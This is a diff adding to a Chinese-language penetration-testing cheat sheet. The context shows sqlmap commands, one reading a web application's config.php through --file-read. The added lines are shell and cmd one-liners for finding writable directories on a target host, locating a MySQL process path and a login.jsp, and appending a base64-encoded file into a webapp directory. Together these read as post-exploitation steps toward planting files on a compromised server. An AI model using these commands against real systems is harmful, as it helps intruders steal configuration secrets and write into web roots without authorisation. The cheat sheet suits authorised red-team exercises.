@@ -226,6 +226,55 @@ python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql -D test -T 
 python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as\config.php"
 ```
 
+## 找可写目录
+```
+
+### linux
+#### 在/root  war文件的同目录下
+写
+find /root -name war|while read file;do sh -c "echo $file">$(dirname $file)/finddir.txt;done
+删
+find /root -name war|while read file;do sh -c "rm $(dirname $file)/finddir.txt";done
+
+#### 在/root  war文件夹下
+写
+find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;done
+删
+find /root -name war|while read file;do sh -c "rm $file/finddir.txt";done
+
+### windows
+#### 在C:\Users\liulangmao\Desktop任意子目录  war.txt文件的同目录下
+写
+for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war.txt') do (echo %i > %i\..\finddir.txt)
+删
+for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war.txt') do (del %i\..\finddir.txt)
+
+#### 在C:\Users\liulangmao\Desktop任意子目录  war文件夹下
+写
+for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war') do (echo %i > %i\finddir.txt)
+删
+for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war') do (del %i\finddir.txt)
+```
+示例：在weblogic靶机/root 所有war文件夹下的finddir.txt文件中写入该war文件夹的路径。
+```
+find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;done
+
+```
+ 程序名找启动路径
+```
+wmic process where name='mysqld.exe' get processid,executablepath,name
+```
+启动路径找login.jsp
+```
+for /f %i in ('dir /s /b D:\UFGOV\U8\login.jsp') do (echo %i)
+```
+base64分段不换行追加写文件
+```
+echo|set /p=\"PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\" > D:\UFGOV\U8\webapps\demonstrate.txt
+```
+
+
+
 ## hydra
 
 ```
